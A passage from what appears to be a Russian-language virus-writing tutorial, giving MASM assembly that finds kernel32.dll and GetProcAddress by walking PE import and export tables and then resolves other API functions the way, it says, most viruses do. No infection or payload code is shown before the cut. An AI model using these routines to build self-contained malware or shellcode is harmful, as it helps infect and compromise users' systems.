&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>IF &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">DWORD</span> PTR <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span>==<span style="color: #7f007f;">&quot;NREK&quot;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;черт, мы могли бы написать так:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;.IF TBYTE PTR [edi]==&quot;LLD.LENREK&quot;,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;но нас сдерживает формат машинной</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;команды Intel в которой константа</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;может быть не более 4 байт</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;нашли запись о kernel32!!!</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>FirstThunk<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ebx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;в edi - VA массива IMAGE_THUNK_DATA</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;в eax адрес какой-то из функций kernel32.dll</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>ENDIF<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span>sizeof IMAGE_IMPORT_DESCRIPTOR<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; NextDLL<br/>
GetKernelImport endp<br/>
<span style="color: black; font-style: italic;">;============================================================</span><br/>
<span style="color: black; font-style: italic;">;Конец процедуры GetKernelImport</span><br/>
<span style="color: black; font-style: italic;">;============================================================</span><br/>
&nbsp;</div>
<p>Здесь были рассмотрены наиболее популярные и известные способы. Если у Вас есть мысли по этому поводу, то присылайте их мне на электронную почту, обсудим вместе.</p>
<h3><a name="c17"></a>Поиск адресов API-функций</h3>
<h4><a name="c171"></a>Поиск GetProcAddress</h4>
<p>Вот мы получили базу <strong>kernel32.dll</strong> в адресном пространстве текущего процесса. Теперь нам надо найти для начала функцию <strong>GetProcAddress</strong>. C ее помощью мы получим желаемые адреса <strong>API</strong>-функций, которые мы будем использовать. Чтобы получить адрес функции <strong>GetProcAddress</strong> будет анализировать таблицу экспорта <strong>PE</strong>-файла.</p>
<p>Для начала находим таблицу экспорта. Из нее получаем адрес массива <strong>AddressOfNames</strong>. Это массив двойных слов. Каждое двойное слово - это <strong>RVA</strong> на <strong>ASCIIZ</strong> строку с именем экспортируемой функции. Мы проходим по этому массиву и сравниваем имя "<strong>GetProcAddress</strong>- с именем экспортируемой функции. Номер слова в <strong>AddressOfNames</strong> будет индексом для массива <strong>AddressOfFunctions</strong>. Но нельзя забывать о элементе <strong>nBase</strong> структуры <strong>IMAGE_EXPORT_DIRECTORY</strong>. Это начальный номер экспорта для экспортируемых функций. После получения индекса функции мы должны нормализовать его значение относительно <strong>nBase</strong>. Полученный индекс используем для получения адреса функции из массива <strong>AddressOfFunctions</strong>.</p>
<p>Вот процедура которая все это делает:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">;============================================================</span><br/>
<span style="color: black; font-style: italic;">;Процедура GetGetProcAddress pNameGetProcAddress</span><br/>
<span style="color: black; font-style: italic;">;Поиск адреса внутри kernel32.dll</span><br/>
<span style="color: black; font-style: italic;">;Вход: в стек кладется смещение имени &quot;GetProcAddress&quot;</span><br/>
<span style="color: black; font-style: italic;">;eax - база kernel32.dll</span><br/>
<span style="color: black; font-style: italic;">;Выход:В eax - адрес функции GetProcAddress</span><br/>
<span style="color: black; font-style: italic;">;============================================================</span><br/>
GetGetProcAddress &nbsp; &nbsp; &nbsp; proc NameFunc<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pushad</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;сохраняем регистры</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;в ebx - база</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ebx</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; assume&nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">:</span>ptr IMAGE_DOS_HEADER<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>e_lfanew&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;в esi - заголовок PE</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; assume&nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">:</span>ptr IMAGE_NT_HEADERS<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>OptionalHeader&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;в esi - адрес опционального заголовка</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; assume&nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">:</span>ptr IMAGE_OPTIONAL_HEADER<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>DataDirectory &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;в esi - адрес DataDirectory</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ebx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;в esi - структура IMAGE_EXPORT_DIRECTORY</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; assume&nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">:</span>ptr IMAGE_EXPORT_DIRECTORY<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>AddressOfNames<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ebx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;в esi - массив имен функций</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">edx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;в edx - храним индекс</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">esi</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: black;">&#93;</span><br/>
NextName<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;поиск следующего имени функции</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ebx</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span>NameFunc<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">14</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;количество байт в &quot;GetProcAddress&quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cld</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">repe</span>&nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmpsb</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>IF <span style="color: #46aa03; font-weight: bold;">ecx</span>==<span style="color: #ff0000;">0</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;нашли имя</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; GetAddr<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>ENDIF<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">inc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edx</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">4</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; NextName<br/>
GetAddr<span style="color: #339933;">:</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;если нашли &quot;GetProcAddress&quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">esi</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>AddressOfNameOrdinals<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ebx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;в esi - массив слов с индесками</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: black;">&#93;</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">*</span><span style="color: #ff0000;">2</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; assume&nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">:</span>ptr IMAGE_EXPORT_DIRECTORY<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>nBase &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;вычитаем начальный ординал</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">inc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;т.к. начальный ординал начинается с 1</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>AddressOfFunctions<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ebx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;в esi - массив адресов функций</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: black;">&#93;</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">*</span><span style="color: #ff0000;">4</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ebx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;в eax - адрес функции GetProcAddress</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; NameFunc<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">popad</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;восстанавливаем регистры</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span>NameFunc<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br/>
GetGetProcAddress &nbsp; &nbsp; &nbsp; endp<br/>
<span style="color: black; font-style: italic;">;============================================================</span><br/>
<span style="color: black; font-style: italic;">;Конец процедуры GetGetProcAddress</span><br/>
<span style="color: black; font-style: italic;">;============================================================</span><br/>
&nbsp;</div>
<h4><a name="c172"></a>Получение остальных адресов функций</h4>
<p>После вызова функции <strong>GetGetProcAddress</strong> в регистре <strong>eax</strong> у нас есть адрес функции <strong>GetProcAddress</strong>. Передавая соответствующие параметры функции, получаем адреса других функций. Вызывать функцию можно как <strong>call eax</strong>. Взляните на код:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #0000ff; font-weight: bold;">.data</span><br/>
<span style="color: #adadad; font-style: italic;">AddA</span>tom1&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #7f007f;">&quot;AddAtomA&quot;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br/>
<span style="color: #0000ff; font-weight: bold;">start</span><span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; GetKernelImport<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; GetBase<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; offset NameGetProcAddress<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; GetGetProcAddress<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; offset AddAtom1 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;указатель на строку</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;передаем базу kernel32.dll</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
&nbsp;</div>
<p>После вызова
<strong>call eax</strong> в регистре <strong>eax</strong> будет лежать адрес функции <strong>AddAtomA</strong>. При поиске не забывайте, что одна и та же функция может присутствовать в 2-х версиях - <strong>ANSI</strong> и <strong>UNICODE</strong>. Функции принимающие <strong>ANSI</strong>-строки, у них в конце имени стоит буква "<strong>A</strong>-. Функции принимающие <strong>UNICODE</strong>-строки, у них в конце имени стоит буква "<strong>W</strong>-. В примере выше, функция <strong>AddAtom</strong> принимает указатель на <strong>ANSI</strong>-строку. Как узнать, что функция существует в двух вариантах? Есть два способа. 1) Подумать :) Если функция принимает какую-нибудь строку, то она точно в двух вариантах.2) В Win32.hlp - справочнике по API-функциям, в описании каждой функции можно посмотреть краткую информацию о функции(кнопка <strong>QuickInfo</strong>). Там есть строка <strong>Unicode</strong>. Если там что-нибудь, кроме <strong>None</strong>, то функция существует в двух вариантах, иначе - в одном. Описание функции <strong>GetProcAddress</strong>, я думаю, Вы посмотрите сами.</p>
<p>Нам может быть полезна функция <strong>LoadLibrary</strong>, которая загружает <strong>PE</strong>-файл в адресное пространство процесса. Если модуль уже загружен, то эта функция вернет нам базовый адрес данного модуля. Она будет нужна, если наш зверь требует функции, которые могут не быть в <strong>KERNEL32.DLL</strong>. Единственный параметр, который передается <strong>LoadLibrary</strong>, это адрес строки с именем требуемой <strong>DLL</strong> или <strong>EXE</strong>-файла. Теперь я опишу, как действуют большинство вирусов при получении адресов <strong>API</strong> функций.</p>
<p>Вирус хранит в своем теле имена <strong>API</strong>-функций чтобы потом найти их адреса. Он может также хранить контрольные суммы для строк, содержащих имена. Но я пока не буду затрагивать теорию контрольных сумм. Все что известно о хешах и контрольных суммах, стандартные алгоритмы и примеры использования, Вы узнаете в соответствующей главе. А пока потерпите. Здесь мы рассмотрим пока только простые имена.</p>
<p>Где-то внутри тела вируса есть такие строки:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">imp<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #7f007f;">'FindFirstFileA'</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br/>
